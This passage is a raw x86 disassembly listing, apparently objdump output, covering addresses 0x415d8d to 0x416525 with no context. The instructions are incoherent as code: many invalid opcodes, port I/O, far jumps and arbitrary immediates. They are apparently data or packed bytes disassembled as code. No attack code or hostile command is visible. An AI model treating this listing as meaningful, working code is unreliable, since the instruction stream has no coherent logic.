  415d8d:	sbb    ch,BYTE PTR [ebx-0x67]
  415d90:	push   es
  415d91:	mov    ebx,0xa14f4248
  415d96:	xor    edx,DWORD PTR [edx]
  415d98:	sbb    BYTE PTR [ecx+0x3fdbf73],bl
  415d9e:	sub    BYTE PTR [edi+0x36],ch
  415da1:	test   al,0x22
  415da3:	jp     0x415da6
  415da5:	shr    BYTE PTR [esi+0x3],1
  415da8:	in     eax,0x74
  415daa:	push   eax
  415dab:	xchg   esp,eax
  415dac:	(bad)  
  415dad:	shl    BYTE PTR [esi],0x6e
  415db0:	call   0x1a2221e1
  415db5:	or     dh,BYTE PTR [edx+0x27]
  415db8:	test   al,0x44
  415dba:	or     al,0xf1
  415dbc:	cmp    DWORD PTR [edx],edx
  415dbe:	mov    ebx,0xa65bdae0
  415dc3:	adc    esi,DWORD PTR [edi-0x6]
  415dc6:	inc    ebp
  415dc7:	or     ebx,DWORD PTR [ebx-0x58]
  415dca:	adc    DWORD PTR [esi+edx*8],esp
  415dcd:	xchg   BYTE PTR [ebx+0xbdf5cb8],ch
  415dd3:	in     al,0x84
  415dd5:	mov    esp,0x9c5a7363
  415dda:	push   eax
  415ddb:	retf   0x5ba7
  415dde:	xor    dl,BYTE PTR ds:0xc1164b87
  415de4:	pop    esp
  415de5:	into   
  415de6:	inc    ebx
  415de7:	push   edi
  415de8:	or     eax,DWORD PTR [ebp-0x42]
  415deb:	add    al,0xf
  415ded:	cmp    BYTE PTR [ebx],bl
  415def:	dec    ecx
  415df0:	shl    DWORD PTR [ecx+0x3f],cl
  415df3:	rcr    BYTE PTR [ecx+ebx*4+0x10b14719],cl
  415dfa:	cmp    eax,0xdb374987
  415dff:	or     DWORD PTR [ebp+0x210ae289],edi
  415e05:	inc    edi
  415e06:	jno    0x415e13
  415e08:	xchg   esp,eax
  415e09:	pop    ecx
  415e0a:	xchg   edx,eax
  415e0b:	jae    0x415dc2
  415e0d:	ins    BYTE PTR es:[edi],dx
  415e0e:	cmp    ch,BYTE PTR ds:0x711c65c2
  415e14:	jb     0x415e36
  415e16:	(bad)  
  415e17:	hlt    
  415e18:	add    cl,bh
  415e1a:	repz and BYTE PTR [ebx],ah
  415e1d:	mov    ebp,0xadef5f2e
  415e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e24:	icebp  
  415e25:	push   ss
  415e26:	cmp    al,BYTE PTR [edx+0x4d248462]
  415e2c:	mov    ch,0x89
  415e2e:	aaa    
  415e2f:	adc    DWORD PTR [eax+ecx*2-0x7e531eb7],eax
  415e36:	adc    bl,BYTE PTR [edx-0x7b]
  415e39:	fdiv   QWORD PTR [ebx-0x399c6a5a]
  415e3f:	das    
  415e40:	test   DWORD PTR [ecx],ebp
  415e42:	inc    ebx
  415e43:	lods   eax,DWORD PTR ds:[esi]
  415e44:	dec    ebx
  415e45:	add    al,0x9d
  415e47:	dec    edx
  415e48:	mov    ecx,edx
  415e4a:	adc    bl,BYTE PTR [ebp+0x720e5297]
  415e50:	js     0x415e0f
  415e52:	add    cl,BYTE PTR [ebp-0x776ba79a]
  415e58:	fdivr  QWORD PTR [edi]
  415e5a:	adc    esi,ebp
  415e5c:	cvtpi2ps xmm5,mm4
  415e5f:	bound  edi,QWORD PTR [edi-0x79]
  415e62:	jb     0x415e96
  415e64:	cli    
  415e65:	inc    ecx
  415e66:	xchg   edi,eax
  415e67:	shl    DWORD PTR [ebp+0x2],0x8e
  415e6b:	test   al,0xc
  415e6d:	push   eax
  415e6e:	push   esi
  415e6f:	sbb    al,0x32
  415e71:	out    0xe4,al
  415e73:	xor    al,0xe1
  415e75:	inc    edx
  415e76:	jecxz  0x415ec9
  415e78:	xchg   DWORD PTR ds:0xf2c26634,edx
  415e7e:	xor    al,0x3d
  415e80:	jle    0x415e19
  415e82:	hlt    
  415e83:	jmp    DWORD PTR [esi]
  415e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e86:	inc    edx
  415e87:	xor    eax,0xf7a2ffac
  415e8c:	dec    DWORD PTR [edi+ecx*8]
  415e8f:	sahf   
  415e90:	sbb    ebp,esp
  415e92:	in     al,0x36
  415e94:	pop    esi
  415e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e96:	jns    0x415e44
  415e98:	adc    ebp,DWORD PTR [edi-0x1561722a]
  415e9e:	mov    bh,0xd6
  415ea0:	fwait
  415ea1:	inc    eax
  415ea2:	sub    ah,cl
  415ea4:	push   esi
  415ea5:	dec    eax
  415ea6:	push   DWORD PTR [edi]
  415ea8:	loopne 0x415e69
  415eaa:	in     al,0x2f
  415eac:	push   eax
  415ead:	ret    0xb301
  415eb0:	fwait
  415eb1:	mov    esp,DWORD PTR [ebp-0x321cc854]
  415eb7:	sti    
  415eb8:	fstp   QWORD PTR [eax+0x68e7b646]
  415ebe:	lahf   
  415ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec0:	pop    edi
  415ec1:	popa   
  415ec2:	fst    DWORD PTR [edx+edi*8-0x2cb702be]
  415ec9:	pop    esi
  415eca:	nop
  415ecb:	ret    
  415ecc:	pop    es
  415ecd:	inc    edi
  415ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ecf:	outs   dx,DWORD PTR ds:[esi]
  415ed0:	into   
  415ed1:	add    eax,0x5372eeba
  415ed6:	add    DWORD PTR [ebx],ebx
  415ed8:	add    al,0xc1
  415eda:	nop
  415edb:	(bad)  
  415edc:	ja     0x415ee6
  415ede:	sbb    BYTE PTR [ebp+0x77df9507],dl
  415ee4:	test   BYTE PTR [edx-0x1e958122],dh
  415eea:	fstp   TBYTE PTR [ebx+0x6c]
  415eed:	mov    bh,0x81
  415eef:	aas    
  415ef0:	cmp    eax,0xa92fa57
  415ef5:	adc    eax,0x3462010e
  415efa:	data16 mov al,ds:0xfee1ae33
  415f00:	dec    ebp
  415f01:	xlat   BYTE PTR ds:[ebx]
  415f02:	scas   eax,DWORD PTR es:[edi]
  415f03:	mov    ebp,0xd51b1d41
  415f08:	push   esp
  415f09:	out    dx,eax
  415f0a:	dec    ebx
  415f0b:	sbb    BYTE PTR [ecx],cl
  415f0d:	xchg   edi,eax
  415f0e:	cmp    al,0x15
  415f10:	xor    edx,DWORD PTR [edx-0x1d7d7af1]
  415f16:	or     eax,0x881e051
  415f1b:	scas   eax,DWORD PTR es:[edi]
  415f1c:	out    dx,al
  415f1d:	pop    es
  415f1e:	into   
  415f1f:	(bad)  fs:[edi-0x4e]
  415f23:	test   eax,0x52026bc9
  415f28:	ret    0xecbe
  415f2b:	lods   eax,DWORD PTR ds:[esi]
  415f2c:	inc    ebx
  415f2d:	inc    ebp
  415f2e:	mov    ch,0x4c
  415f30:	mul    DWORD PTR [edi+0x69dd4a09]
  415f36:	pop    eax
  415f37:	loopne 0x415f27
  415f39:	pop    es
  415f3a:	push   ebp
  415f3b:	mov    eax,0x5b0e238a
  415f40:	jp     0x415f61
  415f42:	or     DWORD PTR [ebx+0x1b532f4f],ebx
  415f48:	inc    ebx
  415f49:	lea    ebx,[ebp-0x3a]
  415f4c:	popa   
  415f4d:	cdq    
  415f4e:	mov    WORD PTR [esi+eax*1],?
  415f51:	adc    cl,al
  415f53:	dec    ecx
  415f54:	das    
  415f55:	fidivr DWORD PTR [ecx]
  415f57:	adc    ah,ah
  415f59:	mov    ah,0xc9
  415f5b:	mov    ch,0xa4
  415f5d:	xchg   BYTE PTR [eax+0x236ada26],bh
  415f63:	dec    edx
  415f64:	add    ecx,DWORD PTR [ebx+esi*8+0x5db5fb50]
  415f6b:	loop   0x415fc0
  415f6d:	mov    ebp,ebx
  415f6f:	jle    0x415fc3
  415f71:	pop    edi
  415f72:	fisttp WORD PTR cs:[edx+ecx*8-0xc]
  415f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f78:	test   dh,dl
  415f7a:	fs jne 0x415f0f
  415f7d:	stos   BYTE PTR es:[edi],al
  415f7e:	xor    ecx,DWORD PTR cs:[eax+0x68f7de3b]
  415f85:	shl    DWORD PTR [edi-0x25902c31],1
  415f8b:	jecxz  0x415f90
  415f8d:	xchg   BYTE PTR [ebp+0x2f19a7db],dl
  415f93:	pop    ebx
  415f94:	bound  esi,QWORD PTR [edx-0xf]
  415f97:	das    
  415f98:	in     eax,0xcb
  415f9a:	dec    esp
  415f9b:	or     al,0x90
  415f9d:	push   0xffffff92
  415f9f:	call   0xf4ca:0x84b7d3d5
  415fa6:	lods   al,BYTE PTR ds:[esi]
  415fa7:	pop    esi
  415fa8:	cmp    al,0x8a
  415faa:	call   0xe45b:0xb33843dd
  415fb1:	rcl    dl,1
  415fb3:	ds (bad) 
  415fb5:	rcl    DWORD PTR [edx+edx*4],1
  415fb8:	ss pop esi
  415fba:	add    ebp,DWORD PTR [edi]
  415fbc:	push   cs
  415fbd:	cwde   
  415fbe:	jmp    0x2079:0x62f732d5
  415fc5:	pop    edx
  415fc6:	sub    eax,0xa23e0286
  415fcb:	stos   DWORD PTR es:[edi],eax
  415fcc:	xor    ecx,esi
  415fce:	int    0xd9
  415fd0:	outs   dx,BYTE PTR ds:[esi]
  415fd1:	jecxz  0x415f78
  415fd3:	pop    ebx
  415fd4:	xchg   BYTE PTR [edi+ebp*1-0x4e671db5],ch
  415fdb:	jp     0x41603d
  415fdd:	shr    BYTE PTR [eax-0x28],0x2b
  415fe1:	xchg   ebx,eax
  415fe2:	xchg   edi,eax
  415fe3:	in     al,0x26
  415fe5:	rcr    ecx,0x86
  415fe8:	add    bh,BYTE PTR [esi-0xf]
  415feb:	imul   edi,DWORD PTR [ebp+0x58b6f6ea],0x71
  415ff2:	iret   
  415ff3:	jne    0x41601f
  415ff5:	inc    eax
  415ff6:	in     al,dx
  415ff7:	aad    0xbf
  415ff9:	mov    ds:0xbaf37dc,eax
  415ffe:	outs   dx,BYTE PTR ds:[esi]
  415fff:	in     eax,dx
  416000:	and    DWORD PTR [ebp+0x71],0xffffffd2
  416004:	(bad)  
  416005:	fstp   TBYTE PTR [edi]
  416007:	sub    al,0x94
  416009:	pop    ds
  41600a:	push   esp
  41600b:	lea    esp,[ebp+edi*4+0x1c]
  41600f:	imul   ecx,DWORD PTR [ecx+ecx*8+0x30],0xc927c30f
  416017:	inc    esi
  416018:	retf   
  416019:	iret   
  41601a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41601b:	popf   
  41601c:	jb     0x415fc0
  41601e:	dec    esp
  41601f:	fild   QWORD PTR [ecx+0x68]
  416022:	sbb    dl,ch
  416024:	test   DWORD PTR [eax-0x678fa8a4],0x5f8ac47b
  41602e:	dec    BYTE PTR ds:0xf317f941
  416034:	stos   BYTE PTR es:[edi],al
  416035:	outs   dx,BYTE PTR ds:[esi]
  416036:	retfw  
  416038:	cmp    bh,BYTE PTR [esi-0x56182721]
  41603e:	in     al,dx
  41603f:	dec    eax
  416040:	(bad)  
  416041:	mov    eax,DWORD PTR [eax]
  416043:	dec    esp
  416044:	scas   eax,DWORD PTR es:[edi]
  416045:	lods   eax,DWORD PTR ds:[esi]
  416046:	ds test eax,0x880950e4
  41604c:	aad    0x2e
  41604e:	mov    ecx,DWORD PTR [ecx+eiz*2-0x1f7cd4bd]
  416055:	dec    ebp
  416056:	mov    WORD PTR [esi+0x2f4365ec],?
  41605c:	fwait
  41605d:	push   ss
  41605e:	loope  0x4160b0
  416060:	xor    BYTE PTR [esp+edx*2],0xc6
  416064:	lea    ebx,gs:[esp+eax*4+0x14]
  416069:	sub    esp,eax
  41606b:	jns    0x416022
  41606d:	sub    ah,BYTE PTR [esi-0x37]
  416070:	std    
  416071:	cld    
  416072:	ds mov ecx,0x28b93074
  416078:	mov    edi,0x474b0f2c
  41607d:	aad    0x46
  41607f:	nop
  416080:	mov    cr5,ebp
  416083:	mov    ?,WORD PTR [edx-0x4a7920e9]
  416089:	xchg   esi,eax
  41608a:	push   edi
  41608b:	xchg   esi,eax
  41608c:	pop    edx
  41608d:	addr16 dec esi
  41608f:	lahf   
  416090:	mov    eax,0x86a1e26b
  416095:	jb     0x41607b
  416097:	sub    BYTE PTR [ebp-0x67dfd64c],ah
  41609d:	mov    esp,0x88f78e3c
  4160a2:	jno    0x41603d
  4160a4:	jb     0x416038
  4160a6:	and    edi,DWORD PTR [eax]
  4160a8:	jbe    0x4160ad
  4160aa:	popf   
  4160ab:	pop    edi
  4160ac:	mov    ebp,DWORD PTR [ebp-0x4b238a88]
  4160b2:	out    0xc2,al
  4160b4:	imul   esi,DWORD PTR [esi+0x45dad700],0xffffff9a
  4160bb:	xchg   esp,eax
  4160bc:	inc    edi
  4160bd:	in     eax,dx
  4160be:	clc    
  4160bf:	pop    esp
  4160c0:	call   0x95c05d11
  4160c5:	dec    esi
  4160c6:	jo     0x416099
  4160c8:	test   al,0x4d
  4160ca:	leave  
  4160cb:	lds    edi,FWORD PTR [esi]
  4160cd:	xlat   BYTE PTR ds:[ebx]
  4160ce:	dec    eax
  4160cf:	mov    eax,0x84676201
  4160d4:	xor    ecx,ecx
  4160d6:	fsub   DWORD PTR [ecx+0x643593c0]
  4160dc:	dec    edi
  4160dd:	cmc    
  4160de:	cmp    DWORD PTR [ecx-0x2c],ebp
  4160e1:	arpl   WORD PTR [edi-0x16],di
  4160e4:	cmp    cl,cl
  4160e6:	xchg   ah,bl
  4160e8:	ds dec edi
  4160ea:	sub    dh,bl
  4160ec:	out    dx,eax
  4160ed:	js     0x416107
  4160ef:	fist   WORD PTR [edx-0x593b82ff]
  4160f5:	dec    esi
  4160f6:	jno    0x4160fe
  4160f8:	int    0x34
  4160fa:	(bad)  
  4160fb:	out    dx,eax
  4160fc:	test   BYTE PTR [edi],cl
  4160fe:	xchg   ebx,eax
  4160ff:	and    DWORD PTR [ecx-0x17dbfe12],edi
  416105:	add    bl,bh
  416107:	int    0xb0
  416109:	dec    esp
  41610a:	jne    0x416097
  41610c:	aam    0x84
  41610e:	mov    esp,0x819bfe7e
  416113:	arpl   sp,cx
  416115:	pop    ds
  416116:	and    ch,bh
  416118:	inc    esp
  416119:	jno    0x41610a
  41611b:	xchg   BYTE PTR [edi-0x72],bl
  41611e:	mov    eax,ds:0x3b7f2986
  416123:	in     al,dx
  416124:	repz push ss
  416126:	aas    
  416127:	in     eax,0xe6
  416129:	sti    
  41612a:	rcr    BYTE PTR ds:0x71ebbaf8,cl
  416130:	mov    ecx,0xef207bc6
  416135:	pop    edi
  416136:	dec    ebx
  416137:	idiv   ebp
  416139:	pop    ebp
  41613a:	out    dx,al
  41613b:	jae    0x416163
  41613d:	fnsave [esi+edx*4]
  416140:	xchg   ebp,eax
  416141:	leave  
  416142:	fild   QWORD PTR [ebx+eiz*2-0x7487966b]
  416149:	mov    dl,0x34
  41614b:	mov    al,ds:0xb619e11f
  416150:	pop    es
  416151:	push   ebx
  416152:	es ss loope 0x416133
  416156:	cs int3 
  416158:	daa    
  416159:	(bad)  
  41615a:	adc    al,0x5
  41615c:	push   es
  41615d:	adc    eax,0x528c373e
  416162:	lea    esp,[eax-0x4b]
  416165:	sub    al,0x8a
  416167:	test   BYTE PTR [ecx-0xf],ch
  41616a:	ret    
  41616b:	push   es
  41616c:	test   BYTE PTR [ebp+0x41682e27],bl
  416172:	or     bh,BYTE PTR [edi+0x72b926ee]
  416178:	nop
  416179:	mov    dl,0xb3
  41617b:	add    DWORD PTR [ebp-0x4143b9ac],0xc4222f9f
  416185:	sti    
  416186:	jno    0x4161b0
  416188:	xchg   ebx,eax
  416189:	or     edx,DWORD PTR [edi]
  41618b:	shl    BYTE PTR [eax+0x4613f4c7],0x57
  416192:	add    eax,0x95a94a2b
  416197:	lahf   
  416198:	shr    DWORD PTR [esi+ecx*4+0x40],cl
  41619c:	rol    DWORD PTR [eax+0x6f],1
  41619f:	out    dx,al
  4161a0:	mov    ah,BYTE PTR [ecx-0x7226bb1f]
  4161a6:	rcr    BYTE PTR [esi-0x3],1
  4161a9:	paddsw mm5,mm4
  4161ac:	mov    ds:0x2efc6785,eax
  4161b1:	icebp  
  4161b2:	ds call 0x295936ba
  4161b8:	jae    0x416154
  4161ba:	jb     0x41618d
  4161bc:	popa   
  4161bd:	aad    0xf2
  4161bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c0:	leave  
  4161c1:	mov    ebp,DWORD PTR [eax-0x35]
  4161c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c5:	cld    
  4161c6:	sbb    eax,0xe07f10ea
  4161cb:	sar    BYTE PTR [esi-0x5a],0x81
  4161cf:	fild   DWORD PTR [edi]
  4161d1:	aaa    
  4161d2:	push   0x1f
  4161d4:	mov    al,0xe6
  4161d6:	mov    edi,0xac7fc4d6
  4161db:	push   ebp
  4161dc:	outs   dx,BYTE PTR ds:[esi]
  4161dd:	fistp  QWORD PTR [eax+0x13]
  4161e0:	xor    eax,0x78786493
  4161e5:	jne    0x41622f
  4161e7:	lahf   
  4161e8:	xor    ebx,ecx
  4161ea:	adc    DWORD PTR [edx-0x68dd9f70],0x8dd263cf
  4161f4:	std    
  4161f5:	cmp    esp,DWORD PTR [edi+eax*8]
  4161f8:	dec    eax
  4161f9:	repz mov al,0xd2
  4161fc:	xchg   ecx,eax
  4161fd:	jo     0x416216
  4161ff:	xchg   BYTE PTR [edx],bl
  416201:	(bad)  
  416202:	xor    esi,DWORD PTR [esi-0x16f2ee66]
  416208:	mov    edx,0xda971ffa
  41620d:	push   ebp
  41620e:	cs test al,0xab
  416211:	pop    ebp
  416212:	in     al,dx
  416213:	push   edi
  416214:	fcomp  DWORD PTR [bp+di]
  416217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416218:	lock jle 0x416205
  41621b:	inc    edi
  41621c:	pop    ebp
  41621d:	sti    
  41621e:	fs sbb eax,0x3a436f6f
  416224:	sbb    esp,esp
  416226:	pop    edx
  416227:	arpl   WORD PTR [edx],bp
  416229:	inc    ecx
  41622a:	ret    
  41622b:	jecxz  0x416223
  41622d:	jmp    0x56bd1003
  416232:	push   eax
  416233:	ja     0x4162ab
  416235:	xor    eax,0x393a7a1e
  41623a:	jns    0x416214
  41623c:	shl    BYTE PTR [esi+0x5a715cc7],1
  416242:	jo     0x4161c9
  416244:	cmp    al,0x61
  416246:	call   0x579eb7c9
  41624b:	cmp    eax,0x7da9ab9d
  416250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416251:	and    al,dh
  416253:	mov    DWORD PTR [ecx-0x23],eax
  416256:	inc    eax
  416257:	jg     0x4162b2
  416259:	retf   
  41625a:	bound  ebx,QWORD PTR [esi+0x6c]
  41625d:	cdq    
  41625e:	es (bad) 
  416260:	fisttp WORD PTR [edx-0x53435095]
  416266:	mov    eax,0xe8915c2c
  41626b:	cmc    
  41626c:	loop   0x41628f
  41626e:	dec    eax
  41626f:	js     0x4162ab
  416271:	mov    edi,0xba93c6f0
  416276:	sub    edx,DWORD PTR ds:0xd9bcd379
  41627c:	sahf   
  41627d:	in     al,dx
  41627e:	push   cs
  41627f:	mov    WORD PTR ds:0x8115c1f3,ds
  416285:	lods   eax,DWORD PTR ds:[esi]
  416286:	cli    
  416287:	xor    ch,BYTE PTR [eax+edx*1+0x1bc059fe]
  41628e:	sub    BYTE PTR fs:[ebx],ah
  416291:	cmp    eax,0xde194ab
  416296:	ins    BYTE PTR es:[edi],dx
  416297:	pop    eax
  416298:	add    BYTE PTR [eax-0x37],al
  41629b:	sahf   
  41629c:	jno    0x41625f
  41629e:	imul   DWORD PTR [edi+0x77]
  4162a1:	je     0x416264
  4162a3:	inc    edi
  4162a4:	sub    dh,dh
  4162a6:	add    cl,bh
  4162a8:	lock and bh,BYTE PTR [ecx+0x2e6af7c7]
  4162af:	sbb    DWORD PTR [edi-0x44],edx
  4162b2:	in     eax,0x9
  4162b4:	adc    DWORD PTR [edx],esi
  4162b6:	mov    WORD PTR ds:0x1751e881,?
  4162bc:	xor    esp,DWORD PTR [ebp-0xa]
  4162bf:	inc    edi
  4162c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162c1:	xchg   esi,eax
  4162c2:	out    dx,eax
  4162c3:	ss lahf 
  4162c5:	adc    bl,bh
  4162c7:	call   0x6b77:0x9404a1a6
  4162ce:	and    eax,0x124e54a5
  4162d3:	xor    BYTE PTR [ebx],bh
  4162d5:	jge    0x416311
  4162d7:	shr    DWORD PTR [esi-0x5f],1
  4162da:	fsubr  QWORD PTR ds:0x424e5048
  4162e0:	mov    al,bh
  4162e2:	sub    al,0xdc
  4162e4:	(bad)  
  4162e5:	inc    eax
  4162e6:	xchg   BYTE PTR [edi+0x77b4b32b],ch
  4162ec:	(bad)  
  4162ed:	pop    eax
  4162ee:	jbe    0x416301
  4162f0:	add    DWORD PTR [edx],ebx
  4162f2:	jl     0x416360
  4162f4:	ss pop esp
  4162f6:	out    dx,al
  4162f7:	lock jb 0x41629c
  4162fa:	sahf   
  4162fb:	in     al,0xa0
  4162fd:	inc    ebx
  4162fe:	loopne 0x416303
  416300:	cmp    ebp,eax
  416302:	sbb    eax,0xa255a8c9
  416307:	inc    esi
  416308:	push   edi
  416309:	pop    DWORD PTR [ebx-0x5036942]
  41630f:	inc    eax
  416310:	pusha  
  416311:	in     eax,0xb5
  416313:	ins    BYTE PTR es:[edi],dx
  416314:	or     al,BYTE PTR [eax+ebx*1]
  416317:	cmp    ebx,DWORD PTR [edx+0x4d68b73a]
  41631d:	es push es
  41631f:	in     eax,0xa
  416321:	std    
  416322:	jl     0x4162a7
  416324:	jl     0x4162bf
  416326:	(bad)  
  416327:	jle    0x4162d0
  416329:	mov    ds:0xe27eae21,al
  41632e:	(bad)  
  416330:	ds cdq 
  416332:	stos   BYTE PTR es:[edi],al
  416333:	hlt    
  416334:	and    BYTE PTR [eax],al
  416336:	retf   0xc815
  416339:	pushf  
  41633a:	fbld   TBYTE PTR [ecx-0x7c]
  41633d:	sub    BYTE PTR [eax],0x1a
  416340:	out    0xa2,eax
  416342:	mov    edi,0x9962e2c8
  416347:	sub    al,0x9b
  416349:	leave  
  41634a:	in     eax,dx
  41634b:	xchg   ecx,ebx
  41634d:	push   esi
  41634e:	pop    ds
  41634f:	sbb    edx,eax
  416351:	xchg   edx,eax
  416352:	pop    esi
  416353:	das    
  416354:	jno    0x4163d3
  416356:	ins    DWORD PTR es:[edi],dx
  416357:	(bad)  
  416358:	sti    
  416359:	cld    
  41635a:	mov    edx,0x6a17d1c2
  41635f:	dec    esi
  416360:	test   eax,0xa8217bc6
  416365:	cmp    BYTE PTR [esp+esi*4+0x5e],cl
  416369:	(bad)  
  41636b:	dec    esi
  41636c:	in     al,0x1a
  41636e:	mov    edx,ebx
  416370:	and    BYTE PTR [eax+0x760f1abe],al
  416376:	push   cs
  416377:	repnz out 0x9c,al
  41637a:	scas   al,BYTE PTR es:[edi]
  41637b:	scas   al,BYTE PTR es:[edi]
  41637c:	jmp    0x73a1:0x4946b400
  416383:	jge    0x416359
  416385:	mov    dl,0xf0
  416387:	pop    esp
  416388:	mov    al,0x87
  41638a:	jl     0x4163d6
  41638c:	pop    es
  41638d:	and    DWORD PTR [ecx],ebx
  41638f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416390:	nop    DWORD PTR [edi+0x5b9f01a3]
  416397:	sbb    BYTE PTR [di],dl
  41639a:	mov    dh,BYTE PTR [ecx+edx*1+0x32e8a57a]
  4163a1:	je     0x4163ab
  4163a3:	xchg   esi,eax
  4163a4:	mov    bh,0x47
  4163a6:	scas   eax,DWORD PTR es:[edi]
  4163a7:	lea    ebx,[ebx-0x22bb034b]
  4163ad:	lods   eax,DWORD PTR ds:[esi]
  4163ae:	js     0x4163bd
  4163b0:	bound  eax,QWORD PTR [ecx]
  4163b2:	pop    eax
  4163b3:	adc    eax,DWORD PTR [ebx-0x61]
  4163b6:	mov    bh,0xb8
  4163b8:	mov    eax,ds:0x950dad4d
  4163bd:	cmp    BYTE PTR ds:0xce5581a8,bh
  4163c3:	popa   
  4163c4:	iret   
  4163c5:	mov    eax,0x8839474d
  4163ca:	sub    ch,BYTE PTR [edi-0x19]
  4163cd:	sub    DWORD PTR [edx-0x59c12741],esp
  4163d3:	mov    esp,DWORD PTR [esi+esi*4]
  4163d6:	pop    esp
  4163d7:	sti    
  4163d8:	sahf   
  4163d9:	fist   DWORD PTR ds:0x4816f1f6
  4163df:	leave  
  4163e0:	dec    DWORD PTR [edi+0x16]
  4163e3:	lods   eax,DWORD PTR ds:[esi]
  4163e4:	cmp    dh,0x60
  4163e7:	xor    edx,DWORD PTR [eax+0x62]
  4163ea:	mov    ch,0x1e
  4163ec:	outs   dx,BYTE PTR ds:[esi]
  4163ed:	sub    bl,bh
  4163ef:	iret   
  4163f0:	push   edi
  4163f1:	fiadd  DWORD PTR [ecx-0x31]
  4163f4:	dec    ebx
  4163f5:	rol    edx,cl
  4163f7:	xchg   ebx,eax
  4163f8:	sahf   
  4163f9:	outs   dx,BYTE PTR ds:[esi]
  4163fa:	add    ebp,DWORD PTR [ebp-0x69]
  4163fd:	hlt    
  4163fe:	push   esp
  4163ff:	push   ecx
  416400:	outs   dx,DWORD PTR ds:[esi]
  416401:	aad    0xfa
  416403:	dec    ebx
  416404:	mov    edi,0xd7c208eb
  416409:	xor    DWORD PTR [ecx-0x2c65d69c],0xffffffeb
  416410:	mov    DWORD PTR [esi+0x445c7fd0],esi
  416416:	xlat   BYTE PTR ds:[ebx]
  416417:	ins    BYTE PTR es:[edi],dx
  416418:	adc    esp,DWORD PTR [edi]
  41641a:	mov    bh,0x52
  41641c:	fldenv [di]
  41641f:	das    
  416420:	jp     0x41648e
  416422:	adc    edi,esi
  416424:	jnp    0x416423
  416426:	pop    es
  416427:	rcl    DWORD PTR [edx+0x23ee3f73],1
  41642d:	mov    ebx,0xf7403f1d
  416432:	xbegin 0x1a76615
  416438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416439:	clc    
  41643a:	daa    
  41643b:	and    BYTE PTR [esi-0x7d],ah
  41643e:	mov    ebp,0xe4bcce55
  416443:	mov    esi,0x79d791db
  416448:	mov    ebp,0xdd25427c
  41644d:	dec    edi
  41644e:	push   eax
  41644f:	or     al,0x17
  416451:	cmp    BYTE PTR [ecx+0x3863f563],ah
  416457:	sti    
  416458:	test   al,0xde
  41645a:	ins    BYTE PTR es:[edi],dx
  41645b:	data16 xor BYTE PTR [ecx+0x40],dl
  41645f:	adc    al,0xda
  416461:	sbb    ch,BYTE PTR [ebp-0x36]
  416464:	push   ss
  416465:	fwait
  416466:	mov    al,0x27
  416468:	(bad)  
  416469:	fsubp  st(6),st
  41646b:	jne    0x416457
  41646d:	and    DWORD PTR [edx+0x7d],0x5a9a7952
  416474:	or     eax,0xfd393747
  416479:	jecxz  0x416408
  41647b:	inc    esi
  41647c:	lahf   
  41647d:	cmp    ecx,ecx
  41647f:	or     BYTE PTR [ebx-0x2e],dl
  416482:	loopne 0x4164ff
  416484:	outs   dx,BYTE PTR ds:[esi]
  416485:	imul   eax,esp,0xaab5a7e8
  41648b:	cld    
  41648c:	jmp    0x4f26:0xf80ec3b6
  416493:	loop   0x41648b
  416495:	scas   al,BYTE PTR es:[edi]
  416496:	popa   
  416497:	dec    ebx
  416498:	xchg   esi,eax
  416499:	arpl   WORD PTR [ebp-0x47],bp
  41649c:	mov    bl,0xe3
  41649e:	inc    BYTE PTR [esi+eiz*8]
  4164a1:	push   0xfffffff3
  4164a3:	sub    BYTE PTR [edx-0x5c],dh
  4164a6:	cld    
  4164a7:	rcr    DWORD PTR [ecx+0x3],1
  4164aa:	aad    0xf0
  4164ac:	inc    ecx
  4164ad:	pop    eax
  4164ae:	jg     0x416487
  4164b0:	lods   eax,DWORD PTR ds:[esi]
  4164b1:	loope  0x4164f7
  4164b3:	jns    0x41644e
  4164b5:	cmp    ebp,ebx
  4164b7:	mov    ch,0xae
  4164b9:	mov    DWORD PTR [eax],ecx
  4164bb:	push   ebp
  4164bc:	bound  ecx,QWORD PTR [ebx]
  4164be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164bf:	sub    ebx,DWORD PTR [esi+0x64]
  4164c2:	aas    
  4164c3:	ret    
  4164c4:	sbb    BYTE PTR [ebx-0x56],dl
  4164c7:	xchg   BYTE PTR [ebp-0x6c345402],bl
  4164cd:	sub    DWORD PTR ds:0xd51aca64,esp
  4164d3:	dec    ebp
  4164d4:	pop    eax
  4164d5:	jmp    0x17ec:0xea7cb3fa
  4164dc:	test   DWORD PTR [eax+0x9],eax
  4164df:	pop    edx
  4164e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e1:	cmp    bh,BYTE PTR [ebx-0x7d]
  4164e4:	lahf   
  4164e5:	pusha  
  4164e6:	and    al,cl
  4164e8:	in     al,0xc6
  4164ea:	add    eax,0xe6f46496
  4164ef:	jg     0x416537
  4164f1:	std    
  4164f2:	in     al,dx
  4164f3:	push   0x73a471c6
  4164f8:	cwde   
  4164f9:	xor    DWORD PTR ds:0x75663aa,esi
  4164ff:	dec    eax
  416500:	clc    
  416501:	dec    BYTE PTR [ebp+0x6df981cf]
  416507:	push   esi
  416508:	and    eax,DWORD PTR [ecx]
  41650a:	add    ebx,DWORD PTR ds:0xa1e90fbc
  416510:	xchg   ebp,eax
  416511:	fsubrp st(5),st
  416513:	popf   
  416514:	rcl    DWORD PTR [eax+0x7864abe0],cl
  41651a:	or     eax,DWORD PTR ds:0x109b869b
  416520:	adc    al,0xa7
  416522:	sbb    dl,BYTE PTR [edi+0x63]
  416525:	rol    BYTE PTR [esi],0x8e
